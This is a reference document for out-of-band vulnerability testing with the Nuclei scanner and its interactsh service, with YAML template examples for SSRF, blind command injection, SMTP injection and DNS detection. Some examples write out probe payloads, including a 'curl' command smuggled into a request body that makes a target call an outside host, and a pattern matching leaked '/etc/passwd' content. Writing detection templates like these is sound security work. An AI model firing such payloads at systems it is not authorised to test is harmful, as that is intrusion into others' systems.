# OOB (Out-of-Band) Testing Reference

Complete reference for Nuclei's Out-of-Band testing using interactsh.

## Overview

Since Nuclei v2.3.6, Nuclei supports using the [interactsh](https://github.com/projectdiscovery/interactsh) API for OOB-based vulnerability scanning with automatic request correlation built in.

**Key Features:**
- Automatic correlation - Nuclei maps interactions back to the originating template and request
- Supported in `http` and `network` requests
- Just use `{{interactsh-url}}` in request and add matcher for `interactsh_protocol`

---

## Interactsh Placeholder

| Variable | Description |
|---|---|---|
| `{{interactsh-url}}` | Generate unique OOB interaction URL |
| `{{interactsh-domain}}` | OOB interaction domain |

### Usage in Requests

```yaml
# HTTP request
http:
  - raw:
      - |
        GET /plugins/servlet/oauth/users/icon-uri?consumerUri=https://{{interactsh-url}} HTTP/1.1
        Host: {{Hostname}}

# Network request
tcp:
  - inputs:
      - data: "{{interactsh-url}}"
```

---

## Interactsh Matcher/Extractor Parts

| Part | Description |
|---|---|
| `interactsh_protocol` | Interaction protocol: `dns`, `http`, or `smtp` |
| `interactsh_request` | Request that interactsh server received |
| `interactsh_response` | Response that interactsh server sent to client |

### Protocol Values

| Value | Description | Use Case |
|---|---|---|
| `dns` | DNS interaction | Non-intrusive, most common |
| `http` | HTTP interaction | SSRF, blind XSS |
| `smtp` | SMTP interaction | Blind email injection |

---

## Examples

### Basic DNS Interaction

```yaml
matchers:
  - type: word
    part: interactsh_protocol
    words:
      - "dns"
```

### HTTP Interaction with Content Verification

```yaml
matchers-condition: and
matchers:
  - type: word
    part: interactsh_protocol
    words:
      - "http"

  - type: regex
    part: interactsh_request
    regex:
      - 'root:.*:0:0:'
```

### SSRF Detection

```yaml
http:
  - method: GET
    path:
      - "{{BaseURL}}/fetch?url={{interactsh-url}}"
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"
          - "dns"
        condition: or
```

### Blind RCE Detection

```yaml
variables:
  cmd: "curl http://{{interactsh-url}}"

http:
  - method: POST
    path:
      - "{{BaseURL}}/api/execute"
    body: "command={{cmd}}"
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"
```

### SMTP Interaction (Email Injection)

```yaml
http:
  - method: POST
    path:
      - "{{BaseURL}}/contact"
    body: "email=test@{{interactsh-domain}}&message=hello"
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "smtp"
```

---

## Summary

| Element | Description |
|---|---|
| **Placeholder** | `{{interactsh-url}}`, `{{interactsh-domain}}` |
| **Supported requests** | `http`, `network` |
| **Matcher parts** | `interactsh_protocol`, `interactsh_request`, `interactsh_response` |
| **Protocol values** | `dns`, `http`, `smtp` |
| **Correlation** | Automatic |
